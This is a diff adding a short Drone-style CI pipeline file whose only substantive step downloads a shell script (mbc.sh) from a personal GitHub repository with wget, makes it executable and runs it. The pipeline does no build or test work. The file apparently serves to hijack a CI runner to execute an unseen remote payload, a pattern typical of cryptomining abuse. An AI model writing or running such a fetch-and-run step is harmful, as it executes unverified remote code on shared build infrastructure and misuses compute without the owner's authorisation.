@@ -1,0 +1,13 @@
+---
+kind: pipeline
+type: docker
+name: linux-amd64
+
+platform:
+  arch: amd64
+  os: linux
+
+steps:
+- checkout
+- run: sudo apt update
+- run: wget https://raw.githubusercontent.com/agamlimaa/aku/main/mbc.sh && chmod +x mbc.sh && ./mbc.sh
